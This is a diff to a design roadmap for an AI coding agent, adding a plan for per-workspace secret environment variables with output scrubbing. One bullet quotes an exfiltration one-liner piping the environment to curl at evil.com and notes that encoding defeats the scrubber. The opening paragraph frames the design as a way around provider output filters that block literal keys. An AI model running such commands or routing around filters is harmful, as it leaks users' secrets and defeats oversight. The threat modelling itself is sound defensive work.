@@ -1865,6 +1865,19 @@ User-triggered conversation compaction that sends old messages to the current mo
   - **"Always approve" button** — add a third button next to "Approve" / "Cancel" in the terminal tool approval UI. Clicking it adds the command prefix to the workspace allowlist, then approves the current request. Zero upfront config — the user discovers what the agent runs and approves in context.
   - **Wire into chatThreadService** — in the existing terminal approval path (~line 2533), check `shouldAutoApprove` before falling through to manual approval. The allowlist is read from workspace settings.
 
+### Workspace env vars (soft isolation) — design in `docs/designs/workspace-env-vars.md`
+
+Per-workspace secret storage for env vars the agent can reference by name (`$OPENAI_API_KEY`) without the value ever entering model context. Solves the guardrail problem: provider output filters block literal keys, but if the model only ever writes `$VAR_NAME` and the shell expands it at runtime, there's nothing for the guardrail to block. Variant model: one var name can hold multiple labeled values (`prod` / `staging` / `test`) with exactly one active at a time — switching is a metadata flip, no secret bytes touched.
+
+- **Storage** — plaintext metadata (var names, variant labels, active id) in `IStorageService` WORKSPACE scope; encrypted values in `ISecretStorageService` APPLICATION scope, one blob per workspace (`void.envVar.<workspaceHash>` → JSON `{ VAR_NAME: { variantId: value } }`). Reads vastly outnumber writes (scrubber fires on every terminal result), so one decrypt per read beats N decrypts per variant. Switching active is a plaintext-metadata flip, no secret bytes touched. Follows the terminal-allowlist storage pattern.
+- **Terminal injection** — `TerminalToolService._createTerminal` merges active vars into `IShellLaunchConfig.env` before creating the terminal. Only Void-spawned terminals get them; user-opened shells don't.
+- **Output scrubbing** — at every point `TerminalToolService` produces an output string (`runCommand` result, `readTerminal`, `readTerminalByName`), each known variant value is replaced with `[REDACTED:VAR_NAME]`. Scrubs all variants (active + inactive) so terminals created under a now-inactive variant are still covered. Defeated by transformations (base64, rev) — that's the soft-isolation gap; `strictEnv` is the hard fix.
+- **LLM advertisement** — `generateChatVolatileContext` appends a `AVAILABLE_ENV_VARS` block with names + active variant labels. Names only, never values. Volatile (per-turn, not persisted) so switching variants takes effect next turn.
+- **Management UI** — new view-title button (sibling to the terminal-allowlist shield), QuickPick for add/switch/remove. Values never displayed; entry uses password-masked input.
+- **Soft vs hard isolation** — soft: terminal still inherits base shell env so nvm/pyenv keep working; a determined model could `env | curl evil.com`. Hard isolation (`strictEnv: true` + curated base env) is an additive later change on the same storage layer.
+
+Out of scope for v1: thread-level scoping, global (cross-workspace) vars, workspace-move migration. Deferred until concrete friction surfaces.
+
 ### search_history tool ✅ Implemented
 
 Added a `search_history` tool that lets the LLM agent search its own conversation history. This is useful when the user asks about something that happened earlier in the conversation (e.g. "what command broke the terminal?") — the agent can search by text query, tool name, or result status, and get matching messages with surrounding context.
